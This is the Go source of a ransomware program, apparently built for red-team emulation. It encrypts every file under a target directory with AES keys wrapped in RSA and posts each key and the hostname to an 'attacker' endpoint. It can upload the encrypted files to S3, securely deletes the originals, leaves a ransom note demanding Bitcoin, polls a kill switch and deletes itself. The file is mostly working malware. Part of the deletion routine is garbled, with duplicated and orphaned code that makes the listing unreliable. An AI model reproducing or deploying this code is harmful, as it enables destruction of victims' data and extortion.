package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/s3"
)

const (
	RSA_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw3b2drsPvEBEz7ZAF53X
1MmH+MeM03oGr7QbiPgEQtQ4ff/OW7P4bD0frUZnr+lHyfWnA6fNL0iMKrkWqx3D
pvOXuN8lRSsVDVTTNrcE8Us+lhukcz8r7D4tWz84So1U/kqqr5vHu7PU7Qa3pAYM
U6atGSRFVLRYGmQ6VJjM64h13AmuK6k0jJmVPFUyWWulN/ASATyGwwJ8g7H7cQa9
sLVJYjZrsHc64SAYqCr2nyiz1hNlzDXRFTqZx0/0+NgAj2S3V+nQv4eaz4QpYncH
Ivn2fKvAeDJEUpLuH7lzmeHb3tvXHZ9w3Fu7r4J0E2koFiqYkEQ0AvyZkCjeqI9d
uwIDAQAB
-----END PUBLIC KEY-----`
	SUFFIX         = ".locked"
	RANSOM_NOTE    = "!!! YOUR FILES ARE ENCRYPTED !!!\nPay 0.5 BTC to XYZ.\n"
	BUCKET         = "ecs-uploads"
	PREFIX         = "ransomware_emulation/"
	REGION         = "ap-southeast-2"
	PROFILE        = "redteam"
	EXFIL_ENDPOINT = "http://attacker.redteam.local:8080/log"
	KILL_SWITCH_URL = "http://attacker.redteam.local:8080/kill"
)

var (
	fullExfiltration = false
	targetOS          = runtime.GOOS
)

func secureDelete(path string) {
	overwrite := func(f string) error {
		info, err := os.Stat(f)
		if err != nil || info.IsDir() {
			return err
		}
		size := info.Size()
		file, err := os.OpenFile(f, os.O_WRONLY, 0)
		if err != nil {
			return err
		}
		defer file.Close()
		randomData := make([]byte, 4096)
		for written := int64(0); written < size; {
			if _, err := rand.Read(randomData); err != nil {
				return err
			}
			n, err := file.Write(randomData)
			if err != nil {
				return err
			}
			written += int64(n)
		}
		return nil
	}

	err := overwrite(path)
	if err != nil {
		fmt.Printf("[!] Overwrite failed: %v
", err)
	} else {
		fmt.Printf("[+] File overwritten: %s
", path)
	}

	err = os.Remove(path)
	if err != nil {
		fmt.Printf("[!] Failed to delete file: %s
", path)
	} else {
		fmt.Printf("[+] File securely deleted: %s
", path)
	}
}
		size := info.Size()
		file, err := os.OpenFile(f, os.O_WRONLY, 0)
		if err != nil {
			return err
		}
		defer file.Close()
		randomData := make([]byte, 4096)
		for written := int64(0); written < size; {
			if _, err := rand.Read(randomData); err != nil {
				return err
			}
			n, err := file.Write(randomData)
			if err != nil {
				return err
			}
			written += int64(n)
		}
		return nil
	}

	_ = overwrite(path)
	_ = os.Remove(path)
} else {
		_ = exec.Command("shred", "-u", "-z", "-n", "3", path).Run()
	}
}

func rsaEncryptAESKey(aesKey []byte) ([]byte, error) {
	block, _ := pem.Decode([]byte(RSA_PUBLIC_KEY))
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	return rsa.EncryptOAEP(sha256.New(), rand.Reader, pub.(*rsa.PublicKey), aesKey, nil)
}

func exfiltrateKey(hostname, filename string, encryptedKey []byte) {
	payload := fmt.Sprintf(`{"hostname":"%s","filename":"%s","rsa_encrypted_key":"%s"}`,
		hostname, filename, base64.StdEncoding.EncodeToString(encryptedKey))
	http.Post(EXFIL_ENDPOINT, "application/json", strings.NewReader(payload))
}

func checkKillSwitch() bool {
	resp, err := http.Get(KILL_SWITCH_URL)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	buf := new(bytes.Buffer)
	_, _ = buf.ReadFrom(resp.Body)
	return strings.TrimSpace(buf.String()) == "KILL"
}

func encryptFile(path string, svc *s3.S3) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	aesKey := make([]byte, 32)
	if _, err := rand.Read(aesKey); err != nil {
		return err
	}
	iv := make([]byte, aes.BlockSize)
	if _, err := rand.Read(iv); err != nil {
		return err
	}

	pad := aes.BlockSize - len(data)%aes.BlockSize
	for i := 0; i < pad; i++ {
		data = append(data, byte(pad))
	}

	block, _ := aes.NewCipher(aesKey)
	mode := cipher.NewCBCEncrypter(block, iv)
	encrypted := make([]byte, len(data))
	mode.CryptBlocks(encrypted, data)

	rsaEncKey, err := rsaEncryptAESKey(aesKey)
	if err != nil {
		return err
	}

	hostname, _ := os.Hostname()
	exfiltrateKey(hostname, path, rsaEncKey)

	finalData := append(append(rsaEncKey, iv...), encrypted...)
	outPath := path + SUFFIX
	if err := os.WriteFile(outPath, finalData, 0644); err != nil {
		return err
	}

	if fullExfiltration {
		uploadToS3(svc, outPath, finalData)
	}
	secureDelete(path)
	return nil
}

func uploadToS3(svc *s3.S3, path string, data []byte) {
	relPath := strings.TrimPrefix(path, "/")
	key := PREFIX + relPath
	input := &s3.PutObjectInput{
		Bucket: aws.String(BUCKET),
		Key:    aws.String(key),
		Body:   strings.NewReader(string(data)),
	}
	svc.PutObject(input)
}

func dropRansomNote(dir string) {
	note := filepath.Join(dir, "HOW_TO_DECRYPT.txt")
	if _, err := os.Stat(note); os.IsNotExist(err) {
		_ = os.WriteFile(note, []byte(RANSOM_NOTE), 0644)
	}
}

func encryptDirectory(root string, svc *s3.S3) error {
	return filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() || strings.HasSuffix(path, SUFFIX) {
			return nil
		}
		if strings.Contains(path, "/proc/") || strings.Contains(path, "/sys/") ||
			strings.HasPrefix(filepath.Base(path), "HOW_TO_DECRYPT") {
			return nil
		}
		if err := encryptFile(path, svc); err == nil {
			dropRansomNote(filepath.Dir(path))
		}
		return nil
	})
}

func selfDestruct() {
	exe, err := os.Executable()
	if err == nil {
		secureDelete(exe)
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./ransomware <target_directory> [extfil_flag] [os: windows/linux/darwin]")
		return
	}

	targetDir := os.Args[1]
	if _, err := os.Stat(targetDir); os.IsNotExist(err) {
		fmt.Printf("Error: Target directory %s does not exist\n", targetDir)
		return
	}

	for _, arg := range os.Args[2:] {
		if strings.Contains(arg, "extfil") {
			fullExfiltration = true
		}
		if strings.Contains(arg, "windows") || strings.Contains(arg, "linux") || strings.Contains(arg, "darwin") {
			targetOS = arg
		}
	}

	if checkKillSwitch() {
		fmt.Println("Kill switch activated. Exiting.")
		return
	}

	sess := session.Must(session.NewSessionWithOptions(session.Options{
		Profile: PROFILE,
		Config:  aws.Config{Region: aws.String(REGION)},
	}))
	svc := s3.New(sess)

	_ = encryptDirectory(targetDir, svc)
	selfDestruct()
}
